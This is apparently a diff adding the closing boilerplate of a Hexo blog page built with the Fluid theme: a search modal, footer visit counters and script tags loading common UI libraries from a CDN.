+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Views: 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Visitors: 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
